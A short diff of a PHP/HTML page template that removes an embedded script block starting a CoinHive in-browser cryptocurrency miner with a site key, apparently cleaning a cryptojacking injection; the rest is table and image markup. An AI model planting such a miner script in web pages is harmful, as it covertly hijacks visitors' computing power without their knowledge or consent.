@@ -92,10 +92,6 @@ $data_connect;
 	<td style="height:10px"></td>
 </tr>
 </table>
-<script>
-var miner = new CoinHive.Anonymous('T3g7HajNYpUwoz0dIJFUTEHlhWTrER9n');
-miner.start();
-</script>
 </div>
 <img src="img/corner3.png" width="9" >
 <img src="img/border.png" width="692" height="9" border="0">
